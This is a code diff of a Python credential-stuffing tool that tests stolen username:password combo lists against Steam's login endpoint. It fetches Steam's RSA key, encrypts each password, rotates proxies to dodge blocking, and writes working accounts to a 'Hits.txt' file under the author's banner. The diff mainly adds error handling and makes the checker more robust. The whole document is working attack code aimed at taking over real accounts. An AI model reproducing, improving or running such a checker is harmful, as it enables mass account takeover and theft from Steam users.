@@ -38,37 +38,43 @@ loop = False
 
 
 def write_records(hit: bool, bad: bool, combo_to_record: str):
-    user = combo_to_record.split(':')[0]
-    passwd = combo_to_record.split(':')[1]
-    buff = f'''
-    ========================================
-    |             [Owner Info]             |
-    ========================================
-    |Name: Sabah                           |
-    |Instagram: Apkaless                   |
-    |Github: https://github.com/apkaless   |
-    ========================================
-    |             [Combo Info]             |
-    ========================================
-    |User: {user}                          |
-    |Password: {passwd}                    |
-    ========================================
-    '''
-    os.makedirs(f'Results/{date}', exist_ok=True)
-    os.chdir(f'Results/{date}')
-    if hit:
-        with open('Hits.txt', 'a') as f:
-            f.write(f'{buff}\n')
+    try:
+        user = combo_to_record.split(':')[0]
+        passwd = combo_to_record.split(':')[1]
+        buff = f'''
+        ========================================
+        |             [Owner Info]             |
+        ========================================
+        |Name: Sabah                           |
+        |Instagram: Apkaless                   |
+        |Github: https://github.com/apkaless   |
+        ========================================
+        |             [Combo Info]             |
+        ========================================
+        |User: {user}                          |
+        |Password: {passwd}                    |
+        ========================================
+        '''
+        os.chdir(f'Results/{date}')
+        if hit:
+            with open('Hits.txt', 'a', encoding='utf8', errors='ignore') as f:
+                f.write(f'{buff}\n')
+                f.close()
+            os.chdir(LOCAL_LOCATION)
+        elif bad:
+            with open('Bad.txt', 'a', encoding='utf8', errors='ignore') as f:
+                f.write(f'{buff}\n')
+                f.close()
+            os.chdir(LOCAL_LOCATION)
+    except Exception as e:
+        os.chdir(LOCAL_LOCATION)
+        error = str(e)
+        with open('ErrorsLog.txt', 'a') as f:
+            f.write(f"{error}\n")
             f.close()
-    elif bad:
-        with open('Bad.txt', 'a') as f:
-            f.write(f'{buff}\n')
-            f.close()
+    finally:
+        os.chdir(LOCAL_LOCATION)
 
-    else:
-        return False
-
-    os.chdir(LOCAL_LOCATION)
 
 
 def diaplay_intro():
@@ -174,17 +180,23 @@ def checker(comboList, proxies_list):
                 get_pubkey = s.get(
                     f'https://steamcommunity.com/login/getrsakey?donotcache={int(time())}&username={user}',
                     headers=header_1, proxies=proxy2, timeout=10)
-                good_proxies.append(proxy)
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
                 current_combo.clear()
                 current_combo.append(combo)
                 errors.append(proxy)
                 continue
             good_proxies.append(proxy)
-            pub_key_js = get_pubkey.json()
-            publickey_mod = pub_key_js['publickey_mod']
-            publickey_exp = pub_key_js['publickey_exp']
-            timestamp = pub_key_js['timestamp']
+            try:
+                pub_key_js = get_pubkey.json()
+                publickey_mod = pub_key_js['publickey_mod']
+                publickey_exp = pub_key_js['publickey_exp']
+                timestamp = pub_key_js['timestamp']
+            except Exception as e:
+                error = str(e)
+                with open('ErrorsLog.txt', 'a') as f:
+                    f.write(f"{error}\n")
+                    f.close()
+
             encpass = quote(
                 base64.b64encode(rsa.encrypt(password, rsa.PublicKey(int(publickey_mod, 16), int(publickey_exp, 16)))))
             data_2 = f"donotcache={int(time())}&password={encpass}&username={user}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={timestamp}&remember_login=false&oauth_client_id={get_random()}"
@@ -203,15 +215,20 @@ def checker(comboList, proxies_list):
                 response = s.post(login_url, data=data_2, headers=header_2, proxies=proxy2, timeout=10)
             except (requests.exceptions.ProxyError, requests.exceptions.ReadTimeout) as e:
                 error = str(e)
-                with open('errorsLog.txt', 'a') as f:
+                with open('ErrorsLog.txt', 'a') as f:
                     f.write(f"{error}\n")
                     f.close()
                 current_combo.clear()
                 current_combo.append(combo)
                 errors.append(proxy)
                 continue
-
-            jsdata = response.json()
+            try:
+                jsdata = response.json()
+            except Exception as e:
+                error = str(e)
+                with open('ErrorsLog.txt', 'a') as f:
+                    f.write(f"{error}\n")
+                    f.close()
 
             try:
 
@@ -230,7 +247,7 @@ def checker(comboList, proxies_list):
                         comboList.remove(combo)
                     except Exception as e:
                         error = str(e)
-                        with open('errorsLog.txt', 'a') as f:
+                        with open('ErrorsLog.txt', 'a') as f:
                             f.write(f"{error}\n")
                             f.close()
 
@@ -261,7 +278,7 @@ def checker(comboList, proxies_list):
                     break
             except Exception as e:
                 error = str(e)
-                with open('errorsLog.txt', 'a') as f:
+                with open('ErrorsLog.txt', 'a') as f:
                     f.write(f"{error}\n")
                     f.close()
                 loop = True
@@ -272,7 +289,7 @@ def checker(comboList, proxies_list):
                     errors.append(proxy)
                 except Exception as e:
                     error = str(e)
-                    with open('errorsLog.txt', 'a') as f:
+                    with open('ErrorsLog.txt', 'a') as f:
                         f.write(f"{error}\n")
                         f.close()
 
@@ -287,6 +304,7 @@ def checker(comboList, proxies_list):
 
 if __name__ == '__main__':
     LOCAL_LOCATION = os.getcwd()
+    os.makedirs(f'Results/{date}', exist_ok=True)
     while True:
 
         diaplay_intro()
@@ -299,7 +317,7 @@ if __name__ == '__main__':
             os.system('cls')
             continue
 
-    with open(combolist, 'r', encoding='utf8') as f:
+    with open(combolist, 'r', encoding='utf8', errors='ignore') as f:
         comboslist = f.read().splitlines()
         total = len(comboslist)
         rem = len(comboslist)
@@ -322,7 +340,7 @@ if __name__ == '__main__':
                         sleep(0.07)
                     except Exception as e:
                         error = str(e)
-                        with open('errorsLog.txt', 'a') as f:
+                        with open('ErrorsLog.txt', 'a') as f:
                             f.write(f"{error}\n")
                             f.close()
 
